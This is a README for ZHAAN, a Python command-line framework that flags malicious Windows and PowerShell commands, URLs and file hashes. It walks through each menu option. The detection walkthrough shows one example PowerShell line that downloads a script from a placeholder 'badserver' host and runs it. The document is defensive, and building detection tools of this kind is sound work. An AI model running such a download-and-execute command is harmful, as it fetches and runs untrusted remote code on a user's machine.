# ZHAAN: Zero-trust Heuristic Automated Analysis for Navigation

### Project Overview
ZHAAN is a comprehensive, multi-layered command-line interface (CLI) security framework developed in Python. It is designed to address the limitations of traditional, static security systems by providing an end-to-end solution for detecting known and emerging cyber threats. The system combines various detection methods to analyze command-line inputs, URLs, and file hashes, offering a robust and adaptable defense mechanism.

### Key Features
* **Live Monitor Mode**: Actively monitors PowerShell command history and running processes in real-time. It applies both Rule-Based and Machine Learning analysis to provide instant threat alerts with timestamps.
* **Rule-Based Detection**: Uses a curated CSV dataset (`rules.csv`) to match commands against known malicious patterns. It provides detailed contextual information, including a description, threat score, and MITRE ATT&CK ID, for an explainable alert.
* **Machine Learning Detection**: Applies a trained SVM-based model to classify commands or URLs as Malicious, Suspicious, or Benign. The model provides a confidence score and highlights high-weight tokens to justify its predictions.
* **Malware File Hash Detection**: Scans a specified folder by computing the MD5, SHA1, and SHA256 hashes of all files and comparing them against a known malicious hash database (`mal.csv`).
* **Experimental ZHAAN GPT**: An experimental, NLP-based module that uses a fine-tuned T5 model to provide human-like reasoning. It provides a classification, a plain-language explanation of what a command or URL does, and a recommendation for next steps.
* **Log Management**: Offers a robust system for viewing, archiving, and exporting detection logs. It automatically rotates logs to manage file size and disk usage.

### System Architecture
ZHAAN operates as a cohesive framework where all detection methods are integrated and accessible via a central CLI.
* The **CLI interface** acts as the control center, allowing the user to trigger different functionalities.
* The **Live Monitor** serves as the primary real-time threat detection engine, correlating data from running processes and PowerShell history with the rule-based and machine learning models.
* The **detection backends** (`rule_engine.py`, `predictor.py`, `malware_scan.py`, and `t5_inference.py`) handle the core logic for their respective detection methods.
* The **Log Management** system (`log_manager.py`) transparently records all detection events for later review and auditing.

![ZHAAN Architecture](https://github.com/user-attachments/assets/97a7c560-1a4f-46bd-a780-0eb2fe3d98e0)



### Secure Coding Techniques
The project was developed with a focus on secure and reliable coding practices to ensure its stability and integrity.
* **Input Normalization**: All command inputs are cleaned and standardized (e.g., lowercasing, removing extra spaces) to prevent attackers from bypassing detection using formatting tricks.
* **Safe Defaults and Fallbacks**: The system is designed with secure baseline behaviors to prevent crashes from unexpected input or missing data.
* **Exception Handling**: `try-except` blocks are used to gracefully handle errors during system interactions, such as accessing processes or files, ensuring the program continues to run without crashing.
* **Controlled Use of Threading**: The Live Monitor uses separate threads for different tasks (e.g., monitoring processes, checking PowerShell history) to prevent resource conflicts and ensure responsiveness.
* **Minimal Use of Global State**: Global variables are used sparingly and only when necessary for thread synchronization, which helps keep the code modular and reduces the risk of data corruption.
* **Contextual Logging**: All detection events are logged with detailed information, including timestamps, sources, and detection results, to provide clear and traceable records for incident review and auditing.

### Installation & Dependencies
ZHAAN is a Python-based CLI tool. You can install it by cloning the repository and installing the required dependencies.

1.  **Clone the Repository**:
    ```bash
    git clone git clone https://github.com/SV13/ZHAAN.git
    cd ZHAAN
    ```

2.  **Install Dependencies**:
    ZHAAN relies on several Python libraries. You can install all of them using `pip`:
    ```bash
    pip install colorama psutil pandas scikit-learn xgboost joblib transformers torch
    ```

3.  **Download Models & Datasets**:
    The system requires several local files to run:
    * `data/rules.csv`
    * `data/Z_ML_dataset.csv`
    * `data/mal.csv`
    * `models/zhaan_model.joblib`
    * `models/zhaan_vectorizer.joblib`
    * `models/zhaan_label_encoder.joblib`
    * `models/t5_zhaan/` (directory containing T5 model and tokenizer files)

    Make sure these files are present in their respective directories after cloning the repository. The models are not included in the main project but are trained using the provided scripts.

### Usage
To run the ZHAAN system, execute the main script:
```bash
python zhaan.py
```

### ZHAAN's SVM-based Model
<img width="662" height="303" alt="ZHAAN_Model" src="https://github.com/user-attachments/assets/06a8b8f9-ae7d-42cc-b9d0-b1cfcde90b80" />

The overall accuracy of the SVM-Based model is 89% and this is the percentage of the correctly classified samples in the test set.


# **ZHAAN Walkthrough**
![zhaan_menu](https://github.com/user-attachments/assets/6a504e5f-697c-4515-a07b-7023d9cc64d5)

ZHAAN is CLI menu of ZHAAN. It has 7 options:

[1] Live Monitor Mode

[2] Run Rule-Based Detection

[3] Run Machine Learning Detection

[4] Malware Identifier

[5] Experimental Zhaan GPT

[6] Log Management

[7] Help

[8] Exit


## Option 1 Monitor Mode

Live Monitor Mode is the combination of both Rule-based and machine learning detection. It’s a live monitor that monitors the commands executed in Powershell in the running machine and the commands that made a process running in task manager.

<img width="481" height="163" alt="m4tbghn" src="https://github.com/user-attachments/assets/d7c3a059-cb60-4894-be33-68c24066af16" />

When the user selects option 1, Zhaan redirects to Live Monitor Mode, the user can see the status “ZHAAN – Live Monitoring Started”. And the user can press ‘q’ or ‘Q’ to stop the live monitoring and return to main menu.

<img width="840" height="275" alt="4htgbir" src="https://github.com/user-attachments/assets/147d1644-1c7c-4ed3-aac6-6e9fb1f2898d" />

Above shows one of the detections result from task manager process, the input from the task manager process will be compared in the rule-based mechanism. If the input and source don’t match in the rules.csv, it will give the output as benign and, in the description, stating, “No rule match found”. For the machine learning model, it will process and classify as done in option 3 and gives its prediction with the tokens that results the prediction.

<img width="843" height="494" alt="tg4g" src="https://github.com/user-attachments/assets/c6a8b1a4-d1d6-4764-807c-e86983c763d7" />

Any inputs being executed in Powershell will be saved in a temporary text file. While ZHAAN cannot directly linked with Powershell due to policy issues, it will take the input from the Powershell temporary text file, and use pass it in the live monitor. 

<img width="825" height="230" alt="3bh4gbij4" src="https://github.com/user-attachments/assets/2cb48ef4-a05a-4f6b-9cf7-add2f20b1135" />

If a Powershell command matched in Rule-Based, it only shows the classification, description of the command, MITRE ID and the score of the command. Other Rule-Based parameters is not displayed to keep the live monitor clean. On the other hand, as usual, the model gives its prediction with the tokens that results the prediction. 

## Option 2 Rule-Based Detection

Rule-Based Detection uses a preset dataset called rules.csv. When the user provides a command, this ZHAAN will compare the command with the entries in the rules.csv. If exists, it gives the information about the command with classification; Else it states the command is not found in the dataset.

<img width="612" height="221" alt="rgivbrtintb" src="https://github.com/user-attachments/assets/495320bf-e141-4cc9-b74e-98120761bfb5" />

The Rule-Based Detection menu will pop up when the user enters 2 in the main menu, showing “ZHAAN – Rule-Based Detection” and asks the user to Enter a command to compare the user input with Column A entries in rules.csv.

<img width="562" height="413" alt="vijutien4v4" src="https://github.com/user-attachments/assets/72df2c64-c973-4eed-b6f3-8d5328635312" />

Above scenario shows where the user suspicious input matches the rules.csv prompt label. It will give the information based on the csv and highlight the classification in yellow if the given command is suspicious.

<img width="599" height="444" alt="3brnvjn4" src="https://github.com/user-attachments/assets/f2bf834c-3f9a-4ec3-8972-82e5fb581241" />

The above scenario shows where the user benign input matches the rules.csv prompt label. It will give the information based on the csv and highlight the classification in green if the given command is benign.

<img width="721" height="355" alt="nbvi4ni" src="https://github.com/user-attachments/assets/3152ac2f-c94e-4cbd-8eea-a58c6118c296" />

The scenario above shows where the user malicious input matches the rules.csv prompt label. It will give the information based on the csv and highlight the classification in red if the given command is malicious. 

## Option 3 Run Machine Learning Detection

Machine Learning Detection uses a trained machine learning model that can classify any given Windows command or any URL. It gives the prediction with the percentage for it and a reason for the prediction showing the tokens that influenced the classification.

<img width="512" height="268" alt="r4nvtn4" src="https://github.com/user-attachments/assets/1abe66de-0a02-449a-97b3-2bf49eece453" />

In above scenario, the user has given the command “rundll32 syssetup.dll” to ZHAAN’s Machine Learning model. After the submission, the classifier algorithm will then classify ZHAAN using a multi-stage classification algorithm trained Support Vector Machine (SVM) model. The command is first preprocessed, that is, it is converted to lowercase and any special characters are removed to make it consistent with the training data of the model. It is then converted into numerical feature vector by TF-IDF vectorizer, a mapping of tokens like rundll32 and dll into high-dimensional space in terms of the importance learned. Once the command is vectorized, then the same is passed on to the SVM model which then returns the probability of the command being Malicious, Suspicious, or Benign. In the given case, the model will have predicted that the command will be Malicious with a probability of 52.34 percent. This categorization is made on the basis of the presence of high-weight tokens like rundll32 and dll, which are more often than not linked to DLL injection, loading of payloads, or indirect execution, all of which are actions that are common in malware seen in the real world. The output of ZHAAN also contains a justification (Why) that consists of a list of the influential tokens that were taken into consideration. This makes the models easier to understand and the users understand the reasoning behind every prediction. The user then gets a menu asking them to either make another command or go back to the main interface. This interaction shows that ZHAAN is able to recognize familiar and unfamiliar threats with the help of context aware feature extraction and real time prediction through machine learning.

## Option 4 Malware Identifier

Signature-based detection is used for identifying malware by scanning static files. ZHAAN will alert when a scanned file is malicious providing its signature, MD5, SHA1, SHA256 and VT score.

<img width="854" height="331" alt="4ntbvijn5rti" src="https://github.com/user-attachments/assets/cb952727-54ac-4b68-9790-2c3ee6a99c32" />

Above shows ‘test.txt’ a test file which having malicious hash been placed in a folder called ‘possible’ with its md5, sha1, and sha256 hashes shown. This file will be used for ZHAAN to scan to detect its signature to be matched.

<img width="664" height="484" alt="n4jno" src="https://github.com/user-attachments/assets/b8276c49-a343-4b5d-a477-dba2d1f0cc02" />

The above figure shows the user use option 4 in the main menu of ZHAAN to enable Malware Identifier. ZHAAN will ask the user to enter a folder path to scan. The user gives a folder path ‘C:\Users\Sharveenn.M\Desktop\possible’ to scan. Then, ZHAAN will read recursively all the files in that directory and subdirectories.
In the process of the scan, ZHAAN calculates the hash values of the files with the help of cryptographic hash functions, MD5, SHA1, and SHA256. The hashes that are calculated in the test.txt file are:

•	MD5: 405704a4638a51665911e77da161cdc0

•	SHA1: 38dcee0a46bf7164c040895f395d2a6d19b43758

•	SHA256: 545d3480a96539da83c24f2bc81d1343c3586368e87860b82711af0959e6764c

The hash value will be compared with ZHAAN’s malware signature data set, mal.csv. In this scenario, it has been identified that there is a direct match, and the file can be described as a sample of a very popular infostealer malware RedLineStealer. Along with that, the dataset has a VirusTotal detection percentage of 51.39, which means that over half of the antivirus engines have detected this file as malicious in the wild.

When a signature match is made, ZHAAN notifies the user with a clean and color-coded output which consists of:

•	The file path of the threat.

•	The three traceability and verification hash codes.

•	The signature that was detected was the malware.

•	The VT detection rate that gives an outward promise on the classification of threat.

## Option 5 Experimental ZHAAN GPT

<img width="821" height="328" alt="2n3rjt4nouvg4" src="https://github.com/user-attachments/assets/d7921445-3323-49fb-94ce-b22fd7fe8e1a" />

Above shows the menu for ZHAAN’s option 5. It is an experimental t5 NLP model targeted to act as an LLM where user inputs a command as input with the prefix ‘Analyze’ and will get a humanlike response on whether the given command is malicious, suspicious, benign with what is the command used for and what should be done if the command is executed accidentally

<img width="982" height="157" alt="n3rivneo" src="https://github.com/user-attachments/assets/399eff60-c774-4439-a0ef-f740475079c3" />

Above shows, the user have input a query starting with the prefix ‘Analyze:’ to make sure that the system can interpret it best:

**analyze: Invoke-WebRequest -Uri http://badserver.com/mal.ps1 -OutFile mal.ps1; ./mal.ps1**

The given command is used in common on malware operations in order to execute malicious PowerShell script on a distant server. Internally, ZHAAN GPT will tokenize an input and feed it into the already trained T5 model that produces a complete sentence. 
 
In this case it returns the response:
Malicious - Downloads and executes a remote shell script in multiple steps, common in malware delivery. Recommendation: Block the domain and isolate the server for further analysis.
This output takes the form of the three-part response:

•	Categorization: Command is flagged as Malicious.

•	Explanation: Identifies the command’s behaviour – downloading and execute shell script which is common in malware delivery.

•	Recommendation: Advising user to block the domain and isolate the server which are typical incident response actions in a real world SOC.


ZHAAN GPT is strong because the system translates a low-level command into actionable useful intelligence in a natural language. The model serves as an aid to the reasoning process- not just to detect, but to advise- and so can be especially useful to students, analysts, or environments where explainability and clarity are valued.

## Option 6 Log Management

The Log Management system of ZHAAN is created to enable the users to see, manipulate and export the history of detection events. The actions that are recorded in every log entry comprise detection outcomes, user inputs, and model predictions, and more.

<img width="607" height="336" alt="brihn" src="https://github.com/user-attachments/assets/2dd6f43c-ed6d-4e39-b70c-a2bbfc8d8da6" />

<img width="752" height="270" alt="jj3nbgi4no" src="https://github.com/user-attachments/assets/75ac7b93-251f-44bb-994f-b5b125f0f6b3" />

Logs are kept in the ‘logs’ directory in plain text so that they are easily accessed and the logs are transparent as shown above.

<img width="427" height="376" alt="yhnnj5n" src="https://github.com/user-attachments/assets/a60454d9-6905-44be-8d35-59bf88291fae" />

The above figure shows the ZHAAN’s log management menu which has the options:

[1] View Current Log

[2] View All Logs

[3] Export Log File

[4] Set Max Log File Size

[5] Return to Main Menu

Under the hood, log rotation is done automatically by the log manager and log files are not allowed to grow beyond a size defined by the user. This saves performance and does not use excessive disk usage.

<img width="814" height="112" alt="jgh5h6" src="https://github.com/user-attachments/assets/55d87e7a-17a5-46e2-9219-1b1c572be0a1" />

<img width="752" height="120" alt="nbg3rn4ing" src="https://github.com/user-attachments/assets/98dadd20-d201-4b94-8138-407b6bc0825d" />

### [1] View Current Log

<img width="814" height="112" alt="t4bvir5n5" src="https://github.com/user-attachments/assets/c4a54ca5-a5b8-490b-9381-447aa8caf42c" />

Above shows the ‘View Current Log’ option output. ZHAAN will show the contents of the log file that is currently active (zhaan_log.txt). This file is the real time chronological log of every single detection made by ZHAAN in the different modules. Each line in the active log contains:

•	A timestamp marking the date and time of the event

•	The source module that generated the event (Live Monitor, Rule-Based, ML Detection, Malware Identify, ZHAAN GPT)

•	The command or process being analyzed

•	The detection results from each source module

This log offers users an overview of activity across modules, a method to audit differences between rule and ML detection, unambiguous traceability with time stamps to support forensic or reporting purposes, and human readable summary without requiring examination of raw files.

### [2] View All Logs

<img width="415" height="576" alt="4nijrvnti4" src="https://github.com/user-attachments/assets/8d7d6228-d9ec-4346-9482-b0f4bb5dec90" />

Above shows the ‘View All Logs’ option output. ZHAAN lists the logs/ directory and shows all accessible log files, the current log, ‘zhaan_log.txt’ and rotated logs. In every listed log file, there is the file name which clearly shows the rotation of log files. The size of the file in kilobytes (KB), which assists the user to know the amount of data contained in each file. This choice is helpful since it has a well-organized history so that users can easily notice the number of log rotations that have taken place. Storage awareness is then useful in gauging the amount of space logs take up as time goes by. In addition, the users later have the option of exporting logs by name in the case of audit or forensics.

### [3] Export Log File

<img width="752" height="567" alt="tbirn" src="https://github.com/user-attachments/assets/f084ed8a-9819-4b31-b9f1-06b5046cad0a" />

Above shows the ‘Export Log File’ option output. The user can export a particular log file to a directory of any choice. When this option is chosen, ZHAAN will list the available log files, numbered, in ‘logs’ directory and the current log, zhaan_log.txt along with the rotated logs. By typing the number, the user chooses the log file wants to export. After choosing, the user is asked to supply an export path, a valid destination to which the file will be copied. When confirmed, ZHAAN will duplicate the chosen log to a given destination by using the file handling operations in Python and inform the user that the export has been completed successfully. This aspect can prove to be particularly beneficial in case of log back up, transmission to a secure repository or transmission to third-party analysts to perform further analysis. It helps in making ZHAAN more useful in real life situations as it facilitates documentation, audits, and forensic investigations and it is very convenient to maintain or carry evidence of suspicious activities or detections.

### [4] Set Max Log File Size

<img width="502" height="257" alt="mnbt5ijno" src="https://github.com/user-attachments/assets/0c176c6c-1a57-4f88-b3d6-fb102d90ea72" />

Above shows the ‘Set Max Log File Size’ option output. The size threshold of individual log files is placed under the control of the users in this option. After it is chosen, ZHAAN will ask the user to enter a new maximum size of files in kilobytes (KB). In this scenario, the user enters 520, ZHAAN will modify its setting that subsequent log files will rotate when they have reached 520 KB. When confirmed, ZHAAN gives a response that the new size limit has been applied successfully. This aspect is particularly helpful in places where the efficiency of storage and management of the size of logs are crucial since it eliminates the possibility of uncontrolled growth of log files whilst constantly monitoring the activity on the system. Allowing the user to adjust this threshold, ZHAAN can be configured to the lightweight deployment, or the high-volume detection configuration
